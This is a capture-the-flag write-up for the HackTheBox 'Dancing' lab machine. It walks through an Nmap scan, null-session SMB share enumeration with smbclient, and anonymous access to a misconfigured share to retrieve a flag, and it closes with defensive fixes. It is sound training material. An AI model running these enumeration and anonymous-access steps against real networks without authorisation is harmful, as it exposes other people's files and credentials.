# HackTheBox — Dancing

**Platform:** HackTheBox (Starting Point — Tier 0) | **OS:** Windows | **Difficulty:** Very Easy | **Status:** Active (free)  
**CVEs Covered:** None — service misconfiguration (anonymous/guest SMB share access)  
**Tools Used:** Nmap, smbclient

---

## Summary

Dancing is a Tier 0 Starting Point machine and the SMB counterpart to Fawn: where Fawn taught anonymous FTP, Dancing teaches anonymous **SMB** (Server Message Block) access on a Windows host. The target exposes the standard Windows file-sharing stack on ports 135, 139, and 445. Enumerating the shares reveals a non-default share named `WorkShares` that has been misconfigured to allow **guest/anonymous connections with no password**. Connecting to it and browsing the per-user folders inside leads to `flag.txt` in the `James.P` directory. As with Fawn there is no exploit, no foothold pivot, and no privilege escalation — the box is a clean demonstration of why open SMB shares are a routine and high-value finding on internal engagements, where they frequently expose credentials, backups, and sensitive business files.

---

## Attack Chain Overview

```
Nmap → 135/139/445 SMB (Windows)
→ smbclient -L → enumerate shares → WorkShares (non-default)
→ smbclient //TARGET/WorkShares  (anonymous, blank password)
→ cd James.P → flag.txt
→ get flag.txt → flag
```

---

## 1. Reconnaissance

### Port Scan



```bash
sudo nmap -p- --min-rate 10000 10.129.32.49
```

```text
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Service/version detection with default scripts:

```bash
sudo nmap -p 135,139,445 -sCV 10.129.32.49
```

```text
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Analysis:** The trio of `135/msrpc`, `139/netbios-ssn`, and `445/microsoft-ds` is the signature of a Windows host running SMB file sharing. Port 445 is the modern SMB transport and the primary target. The natural first move is to enumerate the available shares and check whether any permit anonymous access.

<img width="791" height="396" alt="image" src="https://github.com/user-attachments/assets/d3714dff-82c2-44be-9c6d-d1e02a57450d" />


---

## 2. SMB Enumeration

### Listing Shares

`smbclient -L` lists the shares a server is offering. Pass `-N` to attempt the listing with no authentication (a null session):

```bash
smbclient -L //10.129.32.49/ -N
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
```

**Analysis:** `ADMIN$`, `C$`, and `IPC$` are default administrative shares that require privileged credentials. **`WorkShares`** is non-default and has no comment — a custom share is exactly the kind of thing worth probing for weak permissions.

<img width="739" height="211" alt="image" src="https://github.com/user-attachments/assets/47317663-719c-469b-bc90-433a59d13c21" />


---

## 3. Exploitation — Anonymous SMB Share Access

### Vulnerability Explanation

SMB shares are governed by access-control settings that determine who may connect. When a share is configured to allow the **guest** account or anonymous (null-session) access, anyone who can reach port 445 can browse and download its contents without credentials. `WorkShares` is misconfigured this way. In a real environment this is a serious exposure — internal SMB shares routinely hold password files, configuration backups, scripts with embedded secrets, and confidential documents, all readable by an unauthenticated attacker on the network.

### Connecting and Retrieving the Flag

Connect directly to the share. When prompted for a password, press **Enter** to submit an empty password:

```bash
smbclient //10.129.32.49/WorkShares
```

```text
Enter WORKGROUP\<user>'s password:
Try "help" to get a list of possible commands.
smb: \>
```

The connection succeeds, confirming the misconfiguration. Browse the share — it contains per-user folders:

```text
smb: \> ls
  Amy.J                               D        0  ...
  James.P                             D        0  ...

smb: \> cd James.P
smb: \James.P\> ls
  flag.txt                            A       32  ...
```

Download the flag and exit:

```text
smb: \James.P\> get flag.txt
smb: \James.P\> exit
```

Read the downloaded file:

```bash
cat flag.txt
```

<img width="823" height="408" alt="image" src="https://github.com/user-attachments/assets/83dcf792-570f-4881-8dab-86b9f595c8df" />


**Flag captured.**

---

## Lessons Learned

**Anonymous SMB access is a high-value, low-effort finding.** Like anonymous FTP on Fawn, open SMB shares require no exploit — only a connection. On internal penetration tests, null-session enumeration of SMB is one of the first and most productive checks, frequently turning up credentials and sensitive files that unlock the rest of the network.

**Always enumerate non-default shares.** The default administrative shares (`ADMIN$`, `C$`, `IPC$`) were dead ends; the entire path ran through the custom `WorkShares` share. Anything outside the standard set deserves a permissions check, because custom shares are where misconfigurations live.

**The same misconfiguration class spans protocols.** Fawn (FTP) and Dancing (SMB) are the same lesson in two services: a file-sharing daemon left open to anonymous users. The defensive fix is identical — disable guest/anonymous access (`guest ok = no`, restrict null sessions), apply least-privilege ACLs to every share, and keep nothing sensitive in anonymously readable locations.

---

## References

- [HackTheBox — Dancing (Starting Point)](https://app.hackthebox.com/starting-point)
- [smbclient — Samba manual page](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- [MITRE ATT&CK — T1135: Network Share Discovery](https://attack.mitre.org/techniques/T1135/)
- [Dancing — HackTheBox Write-Up (Abigail Johnson)](https://medium.com/@abigailainyang/3-dancing-starting-point-hack-the-box-write-up-212b5330f6e8)
- [HTB Dancing — SMB Enumeration & Exploitation (Robin_Root)](https://medium.com/@robin_root/htb-writeup-dancing-smb-enumeration-exploitation-7eb2f2cd2387)
